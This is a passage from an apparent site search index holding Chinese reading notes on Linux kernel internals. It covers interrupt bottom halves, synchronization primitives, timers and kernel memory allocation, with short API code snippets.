<p>\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u5fc5\u987b\u5c3d\u53ef\u80fd\u5feb\u901f\u7684\u5b8c\u6210\uff0c\u56e0\u6b64\u6574\u4e2a\u4e2d\u65ad\u5904\u7406\u6d41\u7a0b\u88ab\u5206\u4e3a\u4e86\u4e0a\u4e0b\u4e24\u90e8\u5206\u3002\u5e94\u5c3d\u53ef\u80fd\u5c06\u4efb\u52a1\u653e\u5230\u4e0b\u534a\u90e8\u6267\u884c\uff0c\u9664\u4e86\u4ee5\u4e0b\u60c5\u51b5\uff1a</p> </li> <li> <p>\u5bf9\u65f6\u95f4\u975e\u5e38\u654f\u611f</p> </li> <li>\u548c\u786c\u4ef6\u76f8\u5173</li> <li> <p>\u8981\u4fdd\u8bc1\u4e0d\u88ab\u5176\u4ed6\u4e2d\u65ad\u6253\u65ad</p> </li> <li> <p>\u5185\u6838\u5b9e\u73b0\u4e0b\u534a\u90e8\u7684\u65b9\u5f0f\uff1a</p> </li> <li> <p>\u8f6f\u4e2d\u65ad(2.3)</p> </li> <li>tasklet(2.3)</li> <li> <p>workqueue(2.5)</p> </li> <li> <p>\u8f6f\u4e2d\u65ad</p> </li> <li> <p>\u4e00\u4e2a32\u4e2a\u8868\u9879\u6570\u7ec4\u7528\u4e8e\u6ce8\u518c\u8f6f\u4e2d\u65ad\u3002</p> </li> <li>do_softirq()</li> <li>\u4ec0\u4e48\u65f6\u5019\u89e6\u53d1\u8f6f\u4e2d\u65ad<ul> <li>\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u9000\u51fa\u524d</li> <li>\u5728ksoftirq/n\u5185\u6838\u7ebf\u7a0b\u4e2d</li> </ul> </li> <li>\u907f\u514d\u52a0\u9501\u6765\u63d0\u9ad8\u6027\u80fd</li> <li> <p>\u76f8\u540c\u7c7b\u522b\u7684\u8f6f\u4e2d\u65ad\u53ef\u80fd\u5728\u4e0d\u540c\u5904\u7406\u5668\u4e0a\u540c\u65f6\u6267\u884c</p> </li> <li> <p>tasklet</p> </li> <li> <p>\u57fa\u4e8e\u8f6f\u4e2d\u65ad\u5b9e\u73b0</p> </li> <li> <p>\u4e0d\u540c\u7c7b\u578b\u7684tasklet\uff1aHI_SOFTIRQ, TASKLET_SOFTIRQ\u3002</p> </li> <li>\u76f8\u540c\u7c7b\u522b\u7684tasklet\u4e0d\u80fd\u540c\u65f6\u6267\u884c\uff0c\u4e0d\u540c\u7c7b\u578btasklet\u53ef\u4ee5\u540c\u65f6\u6267\u884c</li> <li> <p>\u907f\u514d\u8f6f\u4e2d\u65ad\u5904\u7406\u51fd\u6570\u6709\u89e6\u53d1\u8f6f\u4e2d\u65ad\uff0c\u5bfc\u81f4\u7528\u6237\u7a7a\u95f4\u8fdb\u7a0b\u9965\u997f\u3002\u5f15\u5165ksoftirq\uff0c\u5f53\u5927\u91cf\u8f6f\u4e2d\u65ad\u51fa\u73b0\u65f6\uff0c\u5185\u6838\u5524\u9192\u4e00\u7ec4\u5185\u6838\u7ebf\u7a0b\u6765\u5904\u7406\u8fd9\u4e9b\u8d1f\u8f7d\uff0c\u8fd0\u884c\u5728\u6700\u4f4e\u4f18\u5148\u7ea7\uff08nice\u503c\u4e3a19\uff09\uff0c\u4fdd\u8bc1\u6700\u7ec8\u80af\u5b9a\u4f1a\u88ab\u6267\u884c\u3002</p> </li> <li> <p>workqueue</p> </li> <li> <p>\u53ef\u4ee5\u963b\u585e</p> </li> <li>\u7531\u5185\u6838\u7ebf\u7a0b\u4ee3\u4e3a\u6267\u884c\uff08\u4e00\u822c\u4f7f\u7528\u9ed8\u8ba4\u7684\uff0c\u4e5f\u53ef\u4ee5\u81ea\u5df1\u521b\u5efa\uff09\uff0c\u53ef\u4ee5\u8c03\u5ea6</li> </ul>","tags":["kernel"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u5185\u6838\u540c\u6b65\u4ecb\u7ecd","title":"\u5185\u6838\u540c\u6b65\u4ecb\u7ecd","text":"<ul> <li>\u7528\u6237\u7a0b\u5e8f\u5e76\u53d1\u6267\u884c\u60c5\u5f62</li> <li>\u4f2a\u5e76\u53d1\uff1a\u8fdb\u7a0b\u88ab\u62a2\u5360\uff0c\u5e76\u91cd\u65b0\u8c03\u5ea6\u3002\u5728\u88ab\u62a2\u5360\u671f\u95f4\uff0c\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u53ef\u80fd\u8bbf\u95ee\u4e34\u754c\u533a</li> <li> <p>\u591a\u6838\u5904\u7406\u5668\uff0c\u8fdb\u7a0b\u5e76\u884c\u6267\u884c\uff08\u771f\u5e76\u53d1\uff09</p> </li> <li> <p>\u5185\u6838\u5e76\u53d1\u6267\u884c\u60c5\u5f62</p> </li> <li>\u5185\u6838\u4e5f\u652f\u6301\u62a2\u5360\u8c03\u5ea6\uff08\u6362\u53e5\u8bdd\u8bf4\uff0c\u5982\u679c\u5185\u6838\u4e0d\u652f\u6301\u62a2\u5360\uff0c\u90a3\u4e48\u5355\u6838\u60c5\u51b5\uff0c\u5185\u6838\u6b63\u5e38\u60c5\u51b5\u5c31\u4e0d\u4f1a\u9047\u5230\u5e76\u53d1\u95ee\u9898\uff09</li> <li>\u4e2d\u65ad</li> <li> <p>SMP</p> </li> <li> <p>\u5728\u5199\u4ee3\u7801\u65f6\u5c31\u9700\u8981\u8003\u8651\u52a0\u9501\uff0c\u800c\u4e0d\u662f\u5199\u5b8c\u4e86\u4e4b\u540e\u518d\u52a0\u9501</p> </li> <li>\u4e2d\u65ad\u5b89\u5168\u4ee3\u7801</li> <li>SMP\u5b89\u5168\u4ee3\u7801</li> <li>\u62a2\u5360\u5b89\u5168\u4ee3\u7801</li> <li>\u521a\u5f00\u59cb\u9501\u7684\u7c92\u5ea6\u90fd\u5f88\u7c97\uff0c\u4f46\u662f\u5f53\u9501\u7684\u7ade\u4e89\u53d8\u5f97\u4e25\u91cd\u65f6\uff0c\u8bbe\u8ba1\u5c31\u5411\u66f4\u7cbe\u7ec6\u7684\u52a0\u9501\u65b9\u5411\u8fdb\u5316</li> </ul>","tags":["kernel"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u5185\u6838\u540c\u6b65\u5b9e\u73b0","title":"\u5185\u6838\u540c\u6b65\u5b9e\u73b0","text":"<ul> <li> <p>\u539f\u5b50\u64cd\u4f5c</p> </li> <li> <p>\u539f\u5b50\u64cd\u4f5c\uff0c\u6bd4\u5982atomic_inc()\u9700\u8981\u5c06\u5185\u5b58\u4e2d\u4e00\u4e2a\u53d8\u91cf\u52a01\u3002\u539f\u5b50\u64cd\u4f5c\u9700\u8981\u786c\u4ef6\u652f\u6301</p> </li> <li> <p>\u539f\u5b50\u6027\u548c\u987a\u5e8f\u6027\uff1a\u539f\u5b50\u6027\u8868\u793a\u64cd\u4f5c\u662f\u4e0d\u53ef\u5206\u5272\u7684\uff0c\u8981\u4e48\u6267\u884c\u5b8c\u8981\u4e48\u4e0d\u6267\u884c\u3002\u800c\u540c\u6b65\u6027\u8868\u793a\u591a\u6761\u6307\u4ee4\u5373\u4f7f\u6267\u884c\u5728\u591a\u4e2a\u6838\u4e0a\uff0c\u4ed6\u4eec\u95f4\u7684\u987a\u5e8f\u4e5f\u4f9d\u7136\u8981\u4fdd\u6301\u3002\u901a\u8fc7\u5c4f\u969c(barrier)\u5b9e\u73b0</p> </li> <li> <p>\u9501</p> </li> <li> <p>\u4e34\u754c\u533a\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\u53ef\u80fd\u975e\u5e38\u590d\u6742\uff0c\u56e0\u6b64\u65e0\u6cd5\u4ec5\u4f7f\u7528\u7b80\u5355\u7684\u539f\u5b50\u64cd\u4f5c\u3002\u6b64\u65f6\u4fbf\u9700\u8981\u5f15\u5165\u9501\u7684\u673a\u5236\u3002</p> </li> <li> <p>\u81ea\u65cb\u9501spinlock\uff1a</p> <ul> <li> <p>\u81ea\u65cb\u9501\u6700\u591a\u53ea\u80fd\u88ab\u4e00\u4e2a\u7ebf\u7a0b\u6301\u6709</p> </li> <li> <p>\u5f53\u4e00\u4e2a\u7ebf\u7a0b\u8bd5\u56fe\u83b7\u5f97\u4e00\u4e2a\u5df2\u7ecf\u88ab\u6301\u6709\u7684\u9501\u65f6\uff0c\u5c31\u4f1a\u8fdb\u5165\u5faa\u73af\u5fd9\u7b49\u5f85\uff0c\u76f4\u5230\u9501\u88ab\u91ca\u653e\u3002</p> </li> <li> <p>\u9002\u7528\u4e8e\u5c0f\u7684\u4e34\u754c\u533a</p> </li> <li> <p>\u53ef\u4ee5\u5728\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u4e2d\u4f7f\u7528\uff08\u4e0d\u4f1a\u8fdb\u5165\u7761\u7720\uff09</p> </li> <li> <p>\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u83b7\u53d6\u81ea\u65cb\u9501\u4e4b\u524d\uff0c\u9700\u8981\u7981\u6b62\u672c\u5730\u4e2d\u65ad\u3002\u5426\u5219\uff0c\u5176\u5b83\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u53ef\u80fd\u6253\u65ad\u5f53\u524d\u4ee3\u7801\uff0c\u5e76\u8bd5\u56fe\u53bb\u83b7\u5f97\u5df2\u7ecf\u88ab\u6301\u6709\u7684\u9501\uff0c\u9020\u6210\u6b7b\u9501\u3002</p> </li> <li> <p><code>spin_lock_irqsave(&amp;mr_lock, flags)     ...//\u4e34\u754c\u533a     spin_unlock_irqrestore(&amp;mr_lock, flags)</code></p> </li> <li> <p>\u8bfb/\u5171\u4eab/S \u9501\uff0c\u5199/\u6392\u5b83/X \u9501</p> </li> </ul> <p>\u5f53\u6709\u5927\u91cf\u8bfb\u9501\u88ab\u5360\u6709\u65f6\uff0c\u53ef\u80fd\u5bfc\u81f4\u5199\u8005\u9965\u997f</p> </li> <li> <p>\u4fe1\u53f7\u91cf</p> <ul> <li>\u4e00\u4e2a\u4efb\u52a1\u8bd5\u56fe\u83b7\u5f97\u4e00\u4e2a\u88ab\u5360\u7528\u7684\u4fe1\u53f7\u91cf\u65f6\uff0c\u4fe1\u53f7\u91cf\u5c06\u5176\u63a8\u8fdb\u4e00\u4e2a\u7b49\u5f85\u961f\u5217\uff0c\u7136\u540e\u8ba9\u5176\u7761\u7720\u3002\u5f53\u6301\u6709\u4fe1\u53f7\u91cf\u7684\u8fdb\u7a0b\u5c06\u4fe1\u53f7\u91cf\u91ca\u653e\u540e\uff0c\u5c06\u7b49\u5f85\u961f\u5217\u4e2d\u7684\u4efb\u52a1\u5524\u9192\uff0c\u5e76\u83b7\u5f97\u8be5\u4fe1\u53f7\u91cf</li> <li>\u4fe1\u53f7\u91cf\u652f\u6301\u591a\u4e2a\u8fdb\u7a0b\u6301\u6709\u540c\u4e00\u4e2a\u4fe1\u53f7\u91cf\uff0c\u5728\u58f0\u660e\u4fe1\u53f7\u91cf\u65f6\u6307\u5b9a\uff0c\u79f0\u4e3a\u4f7f\u7528\u8005\u6570\u91cf\u3002\u4e3a1\u65f6\u5219\u662f\u4e8c\u503c\u4fe1\u53f7\u91cf</li> <li>\u4fe1\u53f7\u91cf\u652f\u6301\u4e24\u4e2a\u539f\u5b50\u64cd\u4f5c\uff0cP(), V()\uff0c\u6765\u81ea\u8377\u5170\u8bedProberen(\u63a2\u67e5), Vershogen(\u589e\u52a0)\u3002linux\u4e2d\u53eb\u505adown()\u548cup()\u3002</li> </ul> </li> <li> <p>seq\u9501\uff1a\u8bfb\u4e4b\u524d\u4fdd\u5b58\u4e00\u4e2a\u5e8f\u5217\u503c\uff0c\u8bfb\u64cd\u4f5c\u4e4b\u540e\u518d\u68c0\u67e5\u4ee5\u4e0b\u5e8f\u5217\u503c\u662f\u5426\u53d8\u5316\u3002\u6ca1\u53d8\u5316\u5219\u8bf4\u660e\u4e34\u754c\u533a\u65f6\u6ca1\u6709\u5199\u64cd\u4f5c\u53d1\u751f\uff0c\u5426\u5219\u5faa\u73af\u91cd\u65b0\u8bfb\u53d6\u3002\u5bf9\u5199\u8005\u6709\u5229\u3002</p> <ul> <li>```c   write_seqlock(&amp;sl)   ...   write_sequnlock(&amp;sl)</li> </ul> <p>do{     seq = read_seqbegin(&amp;sl)     ...   }while(read_seqretry(&amp;sl, seq))   ```</p> <ul> <li> <p>\u4ee3\u7801\u4f4d\u4e8einclude/linux/seqlock.h</p> </li> <li> <p>write_seqlock\u548cwrite_sequnlock\u90fd\u4f1a\u5c06sl\u5185\u90e8\u7684seq\u589e\u52a01</p> </li> <li> <p>\u5bf9\u4e8e\u5199\u8005\u6765\u8bf4\uff0c\u53ef\u4ee5\u76f4\u63a5\u8fdb\u5165\u4e34\u754c\u533a</p> </li> <li> <p>\u5bf9\u4e8e\u8bfb\u8005\u6765\u8bf4\uff0c\u5982\u679c\u7b2c\u4e00\u6b21\u8bfb\u53d6\u5230\u7684seq\u662f\u5947\u6570\uff0c\u5219\u8bf4\u660e\u6709\u5199\u8005\u8fdb\u5165\u4e86\u4e34\u754c\u533a\uff0c\u9700\u8981\u91cd\u65b0\u8bfb\u3002\u6216\u8005\u7b2c\u4e00\u6b21\u8bfb\u53d6\u5230\u7684seq\u548c\u7b2c\u4e8c\u6b21\u8bfb\u53d6\u5230\u7684\u4e0d\u4e00\u81f4\uff0c\u8bf4\u660e\u3002\u5728\u8bfb\u8005\u8fdb\u5165\u4e34\u754c\u533a\u540e\uff0c\u6709\u5199\u8005\u8fdb\u5165\u4e86\u4e34\u754c\u533a\uff0c\u4e5f\u9700\u8981\u91cd\u65b0\u8bfb\u3002</p> </li> <li> <p>\u4e3a\u4e86\u9632\u6b62\u6709\u591a\u4e2a\u5199\u8005\u8fdb\u5165\u4e34\u754c\u533a\uff0cwrite_seqlock\u4e2d\u4e5f\u4f7f\u7528\u4e86\u81ea\u9009\u9501\u5b9e\u73b0\u3002</p> </li> </ul> </li> <li> <p>\u4ee3\u7801\uff1a</p> </li> <li> <p>\u539f\u5b50\u6574\u6570\u64cd\u4f5c\uff1aarch/*/include/atomic.h</p> </li> <li>\u81ea\u65cb\u9501\uff1aspinlock.h</li> <li>\u4fe1\u53f7\u91cf\uff1asemaphore.h\uff0crwsem.h</li> </ul>","tags":["kernel"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u5b9a\u65f6\u5668\u548c\u65f6\u95f4\u7ba1\u7406","title":"\u5b9a\u65f6\u5668\u548c\u65f6\u95f4\u7ba1\u7406","text":"<ul> <li>\u7cfb\u7edf\u5b9a\u65f6\u5668\uff1a\u4e3a\u5185\u6838\u63d0\u4f9b\u4e00\u4e2a\u5468\u671f\u6027\u7684\u65f6\u949f\u4e2d\u65ad\uff0c\u8282\u62cd\u53ef\u4ee5\u8bbe\u7f6e</li> <li>\u8282\u62cd(tick)\uff0c\u8282\u62cd\u7387(tick rate)\u4e5f\u53ebHZ</li> <li>\u8282\u62cd\u7387\u4e00\u822c\u4e3a1000\uff08\u65e9\u671f\u4e3a100\uff09\uff0c\u4e0d\u540c\u4f53\u7cfb\u7ed3\u6784\u4e5f\u4e0d\u4e00\u6837</li> <li>\u8282\u62cd\u7387\u66f4\u9ad8\u53ef\u4ee5\u63d0\u9ad8\u65f6\u95f4\u9a71\u52a8\u4e8b\u4ef6\u7684\u89e3\u6790\u5ea6resultion\uff08\u611f\u89c9\u53ef\u4ee5\u7406\u89e3\u4e3a\u7c92\u5ea6\uff09\uff0c\u5355\u4e5f\u4f1a\u5bfc\u81f4\u65f6\u949f\u4e2d\u65ad\u8d1f\u8f7d\u53d8\u5927\u3002</li> <li> <p>\u4e0d\u4f7f\u7528\u5468\u671f\u65f6\u949f\uff1f\u6709\u4eba\u5c1d\u8bd5\u4f7f\u7528\u52a8\u6001\u7f16\u7a0b\u5b9a\u65f6\u5668\u6765\u9a71\u52a8\u4e00\u4e9b\u4e8b\u4ef6\uff08\u8bbe\u5b9a\u591a\u5c11\u65f6\u95f4\u540e\u89e6\u53d1\u4e2d\u65ad\uff09</p> </li> <li> <p>RTC\u5b9e\u65f6\u65f6\u949f\uff1a\u8bb0\u5f55\u5899\u4e0a\u65f6\u95f4\uff0c\u7528\u4e8e\u7cfb\u7edf\u542f\u52a8\u65f6\u521d\u59cb\u5316xtime\u53d8\u91cf</p> </li> <li> <p>\u5f53\u524d\u5b9e\u9645\u65f6\u95f4\uff08\u5899\u4e0a\u65f6\u95f4\uff09\u5b58\u50a8\u5728xtime\u53d8\u91cf\u4e2d\uff0c\u5b9a\u4e49\u4e8ekernel/timer.c\u3002timespec\u5b9a\u4e49\u5728\u4e2d <pre><code>struct timespec xtime\nstruct timepsec{\n    time_t tv_sec;\n    long tv_nsec;\n}\n</code></pre> <li> <p>\u65f6\u949f\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f</p> </li> <li> <p>\u5206\u4e3a\u4f53\u7cfb\u7ed3\u6784\u76f8\u5173\u90e8\u5206\u548c\u65e0\u5173\u90e8\u5206(do_timer)\u4e24\u90e8\u5206</p> </li> <li>do_timer\u9700\u8981<ul> <li>\u5bf9jiffies_64\u52a01</li> <li>\u6267\u884c\u5230\u671f\u7684\u52a8\u6001\u5b9a\u65f6\u5668</li> <li>scheduler_tick()</li> </ul> </li> <li> <p>\u6839\u636e\u4e2d\u65ad\u53d1\u751f\u5728\u7528\u6237\u7a7a\u95f4\u8fd8\u662f\u5185\u6838\u7a7a\u95f4\uff0c\u5c06\u4efb\u52a1\u7684\u7528\u6237\u65f6\u95f4\u548c\u7cfb\u7edf\u65f6\u95f4\u589e\u52a01\u3002\u7136\u800c\u7531\u4e8e\u5728\u4e00\u4e2a\u8282\u62cd\u671f\u95f4\u53ef\u80fd\u591a\u6b21\u8fdb\u5165\u548c\u9000\u51fa\u5185\u6838\uff0c\u56e0\u6b64\u5b9e\u9645\u4e0a\u5e76\u4e0d\u8db3\u591f\u7cbe\u786e\u3002</p> </li> <li> <p>\u901a\u8fc7sys_gettimeofday\u7cfb\u7edf\u8c03\u7528\u83b7\u5f97\u5899\u4e0a\u65f6\u95f4</p> </li> <li> <p>\u5b9a\u65f6\u5668\uff08\u5185\u6838\u5b9a\u65f6\u5668\uff09(kernel/timer.c)</p> </li> <li> <p>```c     struct timer_list my_timer;</p> <p>init_timer(&amp;my_timer);</p> <p>my_timer.expires = jiffies + delay; my_timer.data = 0; my_timer.function = my_function;</p> <p>add_timer(&amp;my_timer);</p> <p>mod_timer(&amp;my_timer, jiffies+new_delay); del_timer(&amp;my_timer);</p> <p>```</p> </li> <li> <p>\u5b9e\u73b0</p> <ul> <li>\u65f6\u949f\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u6267\u884cupdate_process_timers()\uff0c\u8be5\u51fd\u6570\u8c03\u7528run_local_timers()</li> </ul> <pre><code>void run_local_timers(){\n  raise_softirq(TIMER_SOFTIRQ);\n}\n</code></pre> <ul> <li>\u5373\u5b9a\u65f6\u5668\u4f5c\u4e3a\u8f6f\u4e2d\u65ad\u5728\u4e0b\u534a\u90e8\u4e2d\u6267\u884c</li> </ul> </li> <li> <p>\u4e0d\u80fd\u4f7f\u7528\u5b9a\u65f6\u5668\u6765\u5b9e\u73b0\u786c\u5b9e\u65f6\u4efb\u52a1</p> </li> <li> <p>\u5b9e\u73b0\u5ef6\u8fdf\u6267\u884c</p> </li> <li> <p>\u5fd9\u7b49\u5f85</p> <ul> <li>\u4e0b\u9762\u7684\u4ee3\u7801\u5ef6\u8fdf\u4e24\u79d2</li> </ul> <pre><code>unsigned long delay = jiffies + 2*HZ;\nwhile(time_before(jiffies, delay))\n  ;\n</code></pre> <ul> <li>C\u7f16\u8bd1\u5668\u901a\u5e38\u53ea\u4f1a\u5c06\u53d8\u91cfload\u4e00\u6b21\uff0c\u8fd9\u6837\u7684\u8bdd\u4e0a\u9762\u7684\u4ee3\u7801\u4f7f\u7528\u7684jiffies\u5c31\u4e0d\u5bf9\uff08jiffies\u5728\u540e\u53f0\u968f\u65f6\u949f\u4e2d\u65ad\u4e0d\u65ad\u88ab\u66f4\u65b0\uff09\u3002\u56e0\u6b64\u9700\u8981\u4f7f\u7528volatile\uff0c\u5173\u952e\u5b57volatile\u6307\u793a\u7f16\u8bd1\u5668\u5728\u6bcf\u6b21\u8bbf\u95ee\u53d8\u91cf\u65f6\u90fd\u91cd\u65b0\u91cd\u5185\u5b58\u4e2d\u8bfb\u53d6\u3002</li> </ul> </li> <li> <p>\u77ed\u5ef6\u8fdf</p> <ul> <li> <p>\u5982\u679c\u9700\u8981\u5ef6\u8fdf\u7684\u65f6\u95f4\u77ed\u4e8e\u4e00\u4e2a\u8282\u62cd</p> </li> <li> <p>\u5185\u6838\u4e2d\u63d0\u4f9b\u5ef6\u8fdf\u5fae\u79d2\u548c\u6beb\u79d2\u7684\u51fd\u6570udelay\u548cmdelay\uff08linux/delay.h\uff09</p> </li> <li> <p>udelay\u901a\u8fc7\u6267\u884c\u6570\u6b21\u5faa\u73af\u5b9e\u73b0\uff0c\u800c\u4e0d\u662fjiffies</p> </li> <li> <p>BogoMIPS</p> </li> <li> <p>\u5185\u6838\u5728\u542f\u52a8\u65f6\u5229\u7528calibrate_delay\u8ba1\u7b97loops_per_jiffy\uff0c\u4f4d\u4e8einit/main.c</p> </li> <li> <p>BogoMIPS\u8868\u793a\u5904\u7406\u5668\u6267\u884c\u7a7a\u5faa\u73af\u65f6\uff0c\u6267\u884c\u6307\u4ee4\u7684\u901f\u5ea6\uff08\u76f8\u5f53\u4e8eCPU\u9891\u7387\uff09\uff0c\u5355\u4f4d\uff1a\u767e\u4e07/s</p> <p>\u56e0\u6b64\uff1aBogoMIPS = loops_per_jiffy * HZ / 500000\u3002\u56e0\u4e3a\u4e00\u4e2aloop\u9700\u8981\u4e24\u6761\u6307\u4ee4\u3002</p> </li> <li> <p>\u73b0\u5728\u4e00\u822c\u4f7f\u7528\u786c\u4ef6\u5b9a\u65f6\u5668\u5b9e\u73b0\uff0c\u66f4\u52a0\u7cbe\u786e\u3002\uff08CPU\u9891\u7387\u4f1a\u53d8\u5316\uff09</p> </li> </ul> </li>","tags":["kernel"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u5185\u5b58\u7ba1\u7406","title":"\u5185\u5b58\u7ba1\u7406","text":"<ul> <li>struct page:  <p>\u5185\u6838\u7ed9\u6bcf\u4e2a\u7269\u7406\u9875\u90fd\u5206\u914d\u4e00\u4e2apage\u7ed3\u6784\u4f53\u3002\u867d\u7136\u770b\u4e0a\u53bb\u5f88\u6d88\u8017\u5185\u5b58\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u4e0d\u52301/100\uff0c\u5e76\u4e14\u662f\u503c\u5f97\u7684\u3002</p> <ul> <li> <p>struct zone:  <li> <p>\u4e0d\u540c\u4f53\u7cfb\u7ed3\u6784zone\u7684\u5212\u5206\u4e0d\u4e00\u6837</p> </li> <li>ZONE_NORMAL</li> <li>ZONE_DMA\uff1aDMA\u53ef\u4ee5\u4f7f\u7528\u7684</li> <li> <p>ZONE_HIGHMEM\uff1a\u65e0\u6cd5\u6c38\u4e45\u6620\u5c04\u5230\u5185\u6838\u5730\u5740\u7a7a\u95f4</p> </li> <li> <p>\u5185\u6838\u542f\u52a8\u65f6\u521d\u59cb\u5316\uff1amm/page_alloc.c</p> </li> <li> <p>\u8bf7\u6c42\u5185\u5b58\u7684\u5e95\u5c42\u673a\u5236\uff0c\u4ee5\u9875\u4e3a\u5355\u4f4d\u8bf7\u6c42\u5185\u5b58\uff1a <p>\u5206\u914d2^order\u4e2a\u8fde\u7eed\u7684\u7269\u7406\u9875\uff0c\u5e76\u8fd4\u56de\u7b2c\u4e00\u4e2a\u9875\u5bf9\u5e94page\u6307\u9488</p> <pre><code>struct page * alloc_pages(unsigned int gfp_mask, unsigned int order)\n</code></pre> <p>\u628a\u7ed9\u5b9a\u7684\u9875\u8f6c\u6362\u6210\u903b\u8f91\u5730\u5740</p> <pre><code>void *page_address(struct page *page)\n</code></pre> <p>\u76f4\u63a5\u8fd4\u56de\u8bf7\u6c42\u7684\u7b2c\u4e00\u4e2a\u9875\u7684\u903b\u8f91\u5730\u5740</p> <pre><code>unsigned long __get_free_pages(unsigned int gfp_mask, unsigned int order)\n</code></pre> <p>\u83b7\u5f97\u4e00\u4e2a\u9875</p> <pre><code>struct page*alloc_page(unsigned int gfp_mask)\n</code></pre> <p>\u91ca\u653e</p> <pre><code>void __free_pages(struct page *page, unsigned int order)\nvoid free_pages(unsigned long addr, unsigned int order)\nvoid free_page(unsigned long addr)\n</code></pre> <ul> <li> <p>kmalloc\uff1a <li> <p><code>c     void *kmallock(size_t size, int flags)</code></p> </li> <li> <p>\u83b7\u5f97\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u7684\u4e00\u5757\u8fde\u7eed\u7684\u5185\u6838\u5185\u5b58</p> </li> <li> <p>flag</p> <ul> <li>\u884c\u4e3a\u4fee\u9970\u7b26\uff1a\u5982\u4e0d\u80fd\u7761\u7720</li> <li>\u533a\u4fee\u9970\u7b26</li> </ul> </li> <li> <p>kfree\uff1a\u91ca\u653e\u4e0d\u662fkmalloc\u5206\u914d\u7684\u6216\u5219\u5df2\u7ecf\u88ab\u91ca\u653e\u7684\u5185\u5b58\u53ef\u80fd\u5bfc\u81f4\u4e25\u91cd\u7684\u540e\u679c</p> </li> <li> <p>vmalloc</p> </li> <li> <p>\u865a\u62df\u5730\u5740\u662f\u8fde\u7eed\u7684\uff0c\u800c\u7269\u7406\u5730\u5740\u65e0\u9700\u8fde\u7eed\u3002</p> </li> <li> <p>vmalloc\u4e00\u822c\u5728\u83b7\u5f97\u5927\u5757\u5185\u5b58\u65f6\u4f7f\u7528\uff1a\u9700\u8981\u5efa\u7acb\u9875\u8868\u9879\uff0c\u6027\u80fd\u4f4e</p> </li> <li> <p>slab\u5206\u914d\u5668</p> </li> <li> <p>\u4f5c\u7528\uff1a\u907f\u514d\u9891\u7e41\u5206\u914d\u548c\u91ca\u653e\u9875\u3002</p> <ul> <li>slab\u8d1f\u8d23\u5e95\u5c42\u7684\u5bf9\u9f50\u3001\u7740\u8272\u3001\u5206\u914d\u3001\u91ca\u653e\u7b49\u7b49</li> <li>\u5982\u679c\u9700\u8981\u9891\u7e41\u521b\u5efa\u5f88\u591a\u76f8\u540c\u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u5e94\u8be5\u4f7f\u7528slab\uff0c\u800c\u4e0d\u662f\u81ea\u5df1\u521b\u5efa\u7a7a\u95f2\u94fe\u8868\u3002</li> </ul> </li> <li> <p>\u6bd4\u8f83\u7279\u6b8a\u7684\u51e0\u70b9</p> <ul> <li>\u8ba9\u90e8\u5206\u7f13\u5b58\u4e13\u5c5e\u4e8e\u5355\u4e2a\u5904\u7406\u5668\uff0c\u90a3\u4e48\u5206\u914d\u548c\u91ca\u653e\u5c31\u53ef\u4ee5\u5728\u4e0d\u52a0SMP\u9501\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c</li> <li>\u5bf9\u5b58\u653e\u7684\u5bf9\u8c61\u8fdb\u884c\u7740\u8272(colored)\uff0c\u53ef\u4ee5\u9632\u6b62\u591a\u4e2a\u5bf9\u8c61\u6620\u5c04\u5230\u76f8\u540c\u7684cache line</li> </ul> </li> <li> <p>\u539f\u7406\uff1a</p> <ul> <li>\u9891\u7e41\u4f7f\u7528\u7684\u6570\u636e\u7ed3\u6784\u4f1a\u88ab\u9891\u7e41\u5206\u914d\u548c\u91ca\u653e\uff0c\u56e0\u6b64\u9700\u8981\u7f13\u5b58\u5b83\u4eec\u3002</li> <li>\u4f7f\u7528\u4e0d\u540c\u7684cache\u6765\u7f13\u5b58\u4e0d\u540c\u7684\u5bf9\u8c61\uff0c\u5982\u7528\u4e8e\u5b58\u653e\u8fdb\u7a0b\u63cf\u8ff0\u7b26\uff0c\u7d22\u5f15\u8282\u70b9\u7684\u5bf9\u8c61</li> <li>cache\u7531\u82e5\u5e72\u4e2aslab\u7ec4\u6210\uff0c\u4e00\u4e2aslab\u5305\u542b\u82e5\u5e72\u4e2a\u8fde\u7eed\u7684\u7269\u7406\u9875</li> <li>slab\u53ef\u80fd\u4e3a\u5904\u4e8e\uff1a\u6ee1\uff0c\u90e8\u5206\u6ee1\uff0c\u7a7a\u4e09\u79cd\u72b6\u6001\u4e4b\u4e00\u3002\u4f18\u5148\u5728\u90e8\u5206\u6ee1\u7684slab\u4e2d\u5206\u914d\u5bf9\u8c61\u3002</li> </ul> </li> <li> <p>\u63a5\u53e3</p> <ul> <li> <p>\u521b\u5efa\u4e00\u4e2acache   <pre><code>kmem_cache_t *kmem_cache_create(const char *name, size_t size,\n                                size_t align, unsigned long flags,\n                                void (*ctor)(void *, kmem_cache_t *, unsigned long),\n                                void (*ctor)(void *, kmem_cache_t *, unsigned long))\n</code></pre></p> </li> <li> <p>size\u4e3a\u5bf9\u8c61\u7684\u5927\u5c0f</p> </li> <li> 